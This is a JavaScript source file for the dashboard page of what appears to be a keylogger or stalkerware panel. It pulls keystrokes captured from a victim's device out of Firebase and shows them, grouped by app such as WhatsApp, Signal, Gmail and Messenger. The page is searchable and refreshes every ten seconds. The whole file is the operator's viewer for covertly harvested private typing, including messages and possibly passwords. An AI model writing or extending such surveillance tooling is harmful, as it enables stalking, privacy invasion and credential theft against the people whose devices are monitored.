/* ═══════════════════════════════════════════════════════════════
   Keylogger page — reads key_inputs/{deviceId} from Firebase RTDB.
   Structure:
     key_inputs/{deviceId}/{appName}/{timestamp-(N)}: "text"

   Features:
   • Collapsible per-app cards with event delegation (no inline onclick)
   • App name + "X messages" count shown on the card header
   • Expanded view: newest message (highest serial) on top
   ═══════════════════════════════════════════════════════════════ */

Pages.keylogger = {
  _data: {},
  _all: [],
  _expanded: new Set(),

  render(root) {
    const id = App.dev();
    if (!id) {
      root.innerHTML = '<div class="empty"><span class="material-symbols-rounded">keyboard</span><p>No device selected.</p></div>';
      return;
    }

    root.innerHTML =
      '<div class="page-head" style="display:flex;align-items:flex-end;justify-content:space-between;gap:12px;flex-wrap:wrap">' +
        '<div>' +
          '<h2 style="display:flex;align-items:center;gap:8px;">' +
            '<span class="material-symbols-rounded" style="font-size:22px;">keyboard</span>' +
            'Key Logs' +
          '</h2>' +
          '<p>Captured keystrokes from <strong>' + U.esc(id) + '</strong> \u2014 refreshes every 10s.</p>' +
        '</div>' +
        '<div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">' +
          '<input class="input" id="kl-search" placeholder="Search app or message\u2026" style="width:200px;">' +
          '<button class="btn btn-ghost btn-sm" id="kl-refresh">' +
            '<span class="material-symbols-rounded">refresh</span>Refresh' +
          '</button>' +
        '</div>' +
      '</div>' +
      '<div id="kl-list" style="display:flex;flex-direction:column;gap:12px;margin-top:4px;">' +
        '<div class="skeleton"></div>' +
        '<div class="skeleton" style="margin-top:8px"></div>' +
      '</div>';

    document.getElementById('kl-refresh').onclick = function() { Pages.keylogger._load(id); };
    document.getElementById('kl-search').oninput = function(e) { Pages.keylogger._filter(e.target.value); };

    // Single delegated listener — survives innerHTML re-renders of the list
    document.getElementById('kl-list').addEventListener('click', function(e) {
      var header = e.target.closest('.kl-app-header');
      if (!header) return;
      var card = header.closest('.kl-app-card');
      if (!card) return;
      var appName = card.getAttribute('data-kl-app');
      if (appName === null) return;
      Pages.keylogger._toggle(appName);
    });

    Pages.keylogger._load(id);
    App.addTimer(setInterval(function() { Pages.keylogger._load(id, true); }, 10000));
  },

  /* ── Fetch & parse ── */
  async _load(id, quiet) {
    var list = document.getElementById('kl-list');
    if (!list) return;

    var raw = null;
    try {
      raw = await FB.get('key_inputs/' + id);
    } catch(e) {
      if (!quiet) {
        list.innerHTML = '<div class="empty"><span class="material-symbols-rounded">cloud_off</span><p>Failed to load: ' + U.esc(e.message) + '</p></div>';
      }
      return;
    }
    if (!document.getElementById('kl-list')) return;

    var byApp = {};
    if (raw && typeof raw === 'object') {
      var appNames = Object.keys(raw);
      for (var i = 0; i < appNames.length; i++) {
        var appName = appNames[i];
        var sessions = raw[appName];
        if (!sessions || typeof sessions !== 'object') continue;
        if (!byApp[appName]) byApp[appName] = [];
        var keys = Object.keys(sessions);
        for (var j = 0; j < keys.length; j++) {
          var key = keys[j];
          var text = String(sessions[key] || '');
          var parsed = Pages.keylogger._parseKey(key);
          byApp[appName].push({
            key: key,
            text: text,
            dateStr: parsed.dateStr,
            serial: parsed.serial,
            serialNum: parsed.serialNum
          });
        }
      }
    }

    // Sort: newest (highest serialNum) first
    var appList = Object.keys(byApp);
    for (var i = 0; i < appList.length; i++) {
      byApp[appList[i]].sort(function(a, b) {
        if (b.serialNum !== a.serialNum) return b.serialNum - a.serialNum;
        return b.key.localeCompare(a.key);
      });
    }

    Pages.keylogger._data = byApp;
    Pages.keylogger._all = appList;
    Pages.keylogger._render();
  },

  _filter(q) {
    Pages.keylogger._render((q || '').toLowerCase());
  },

  /* ── Render card list ── */
  _render(q) {
    q = q || '';
    var list = document.getElementById('kl-list');
    if (!list) return;
    var data = Pages.keylogger._data || {};
    var apps = (Pages.keylogger._all || []).slice();

    if (q) {
      apps = apps.filter(function(app) {
        if (app.toLowerCase().indexOf(q) !== -1) return true;
        var msgs = data[app] || [];
        for (var i = 0; i < msgs.length; i++) {
          if (msgs[i].text.toLowerCase().indexOf(q) !== -1) return true;
          if (msgs[i].key.toLowerCase().indexOf(q) !== -1) return true;
        }
        return false;
      });
    }

    if (!apps.length) {
      list.innerHTML = '<div class="empty"><span class="material-symbols-rounded">keyboard_hide</span><p>No key logs ' + (q ? 'match your search' : 'captured yet') + '.</p></div>';
      return;
    }

    var html = '';
    for (var i = 0; i < apps.length; i++) {
      var appName = apps[i];
      var msgs = data[appName] || [];
      var isOpen = Pages.keylogger._expanded.has(appName);
      var count = msgs.length;
      var iconUrl = Pages.keylogger._appIcon(appName);
      var previewText = count ? Pages.keylogger._cleanText(msgs[0].text).slice(0, 65) : '';
      if (previewText.length >= 65) previewText += '\u2026';

      html += '<div class="kl-app-card' + (isOpen ? ' open' : '') + '" data-kl-app="' + U.esc(appName) + '">';
      html +=   '<div class="kl-app-header">';
      html +=     '<div class="kl-app-icon-wrap">';
      html +=       '<img class="kl-app-icon" src="' + iconUrl + '" alt="' + U.esc(appName) + '" onerror="this.style.display=\'none\';this.nextElementSibling.style.display=\'flex\';">';
      html +=       '<span class="kl-icon-fallback material-symbols-rounded" style="display:none">apps</span>';
      html +=     '</div>';
      html +=     '<div class="kl-app-info">';
      html +=       '<div class="kl-app-name">' + U.esc(appName) + '</div>';
      html +=       '<div class="kl-app-count">' + count + ' message' + (count !== 1 ? 's' : '') + '</div>';
      if (previewText) {
        html +=     '<div class="kl-app-preview">' + U.esc(previewText) + '</div>';
      }
      html +=     '</div>';
      html +=     '<div class="kl-app-meta">';
      html +=       '<span class="kl-badge">' + count + '</span>';
      html +=       '<span class="material-symbols-rounded kl-chevron">' + (isOpen ? 'expand_less' : 'expand_more') + '</span>';
      html +=     '</div>';
      html +=   '</div>';

      if (isOpen) {
        html += '<div class="kl-chat-area"><div class="kl-chat-scroll">';
        for (var j = 0; j < msgs.length; j++) {
          html += Pages.keylogger._bubble(msgs[j], appName, iconUrl);
        }
        html += '</div></div>';
      }

      html += '</div>';
    }

    list.innerHTML = html;
  },

  /* ── Toggle expand/collapse ── */
  _toggle(appName) {
    if (Pages.keylogger._expanded.has(appName)) {
      Pages.keylogger._expanded.delete(appName);
    } else {
      Pages.keylogger._expanded.add(appName);
    }
    var q = '';
    var searchEl = document.getElementById('kl-search');
    if (searchEl) q = (searchEl.value || '').toLowerCase();
    Pages.keylogger._render(q);
  },

  /* ── Single message bubble ── */
  _bubble(m, appName, iconUrl) {
    var clean = Pages.keylogger._cleanText(m.text);
    var html = '';
    html += '<div class="kl-message">';
    html +=   '<div class="kl-msg-icon-wrap">';
    html +=     '<img class="kl-msg-icon" src="' + iconUrl + '" alt="' + U.esc(appName) + '" onerror="this.style.display=\'none\';this.nextElementSibling.style.display=\'flex\';">';
    html +=     '<span class="kl-msg-icon-fb material-symbols-rounded" style="display:none">apps</span>';
    html +=   '</div>';
    html +=   '<div class="kl-msg-body">';
    html +=     '<div class="kl-msg-header">';
    html +=       '<span class="kl-msg-app">' + U.esc(appName) + '</span>';
    html +=       '<span class="kl-msg-serial">#' + U.esc(m.serial) + '</span>';
    html +=       '<span class="kl-msg-time">' + U.esc(m.dateStr) + '</span>';
    html +=     '</div>';
    html +=     '<div class="kl-bubble">';
    html +=       '<span class="kl-bubble-text">' + (clean ? U.esc(clean) : '<em style="opacity:0.35">empty</em>') + '</span>';
    html +=     '</div>';
    html +=   '</div>';
    html += '</div>';
    return html;
  },

  /* Parse "08-09-26-09:35 am-(1)" */
  _parseKey(key) {
    var s = String(key);
    var m = s.match(/^(.*)-\((\d+)\)$/);
    if (m) {
      return { dateStr: m[1].trim(), serial: m[2], serialNum: parseInt(m[2], 10) || 0 };
    }
    return { dateStr: s, serial: '?', serialNum: 0 };
  },

  /* Strip newlines & extra spaces */
  _cleanText(t) {
    return String(t || '').replace(/\n+/g, ' ').replace(/\s{2,}/g, ' ').trim();
  },

  /* App icon map + DuckDuckGo fallback */
  _appIcon(appName) {
    var map = {
      'Messenger':        'https://www.facebook.com/favicon.ico',
      'Facebook':         'https://www.facebook.com/favicon.ico',
      'WhatsApp':         'https://web.whatsapp.com/favicon.ico',
      'Telegram':         'https://web.telegram.org/favicon.ico',
      'Instagram':        'https://www.instagram.com/favicon.ico',
      'Snapchat':         'https://www.snapchat.com/favicon.ico',
      'Twitter':          'https://twitter.com/favicon.ico',
      'X':                'https://x.com/favicon.ico',
      'Gmail':            'https://mail.google.com/favicon.ico',
      'YouTube':          'https://www.youtube.com/favicon.ico',
      'Chrome':           'https://www.google.com/favicon.ico',
      'Samsung Notes':    'https://img.icons8.com/color/48/note.png',
      'Samsung Internet': 'https://img.icons8.com/color/48/internet-explorer.png',
      'Phone':            'https://img.icons8.com/color/48/phone.png',
      'Messages':         'https://img.icons8.com/color/48/sms.png',
      'Contacts':         'https://img.icons8.com/color/48/contacts.png',
      'Calculator':       'https://img.icons8.com/color/48/calculator.png',
      'Camera':           'https://img.icons8.com/color/48/camera.png',
      'Gallery':          'https://img.icons8.com/color/48/gallery.png',
      'TikTok':           'https://www.tiktok.com/favicon.ico',
      'Viber':            'https://www.viber.com/favicon.ico',
      'Signal':           'https://signal.org/favicon.ico',
      'Discord':          'https://discord.com/favicon.ico',
      'Skype':            'https://www.skype.com/favicon.ico',
      'Line':             'https://line.me/favicon.ico',
      'WeChat':           'https://www.wechat.com/favicon.ico',
      'KakaoTalk':        'https://www.kakaocorp.com/favicon.ico',
      'Notes':            'https://img.icons8.com/color/48/note.png',
      'Keep':             'https://keep.google.com/favicon.ico',
      'Maps':             'https://maps.google.com/favicon.ico',
      'Google Maps':      'https://maps.google.com/favicon.ico',
      'Keyboard':         'https://img.icons8.com/color/48/keyboard.png'
    };
    if (map[appName]) return map[appName];
    var slug = encodeURIComponent(appName.toLowerCase().replace(/\s+/g, ''));
    return 'https://icons.duckduckgo.com/ip3/' + slug + '.com.ico';
  },

  destroy() {
    Pages.keylogger._data = {};
    Pages.keylogger._all = [];
    Pages.keylogger._expanded = new Set();
  }
};
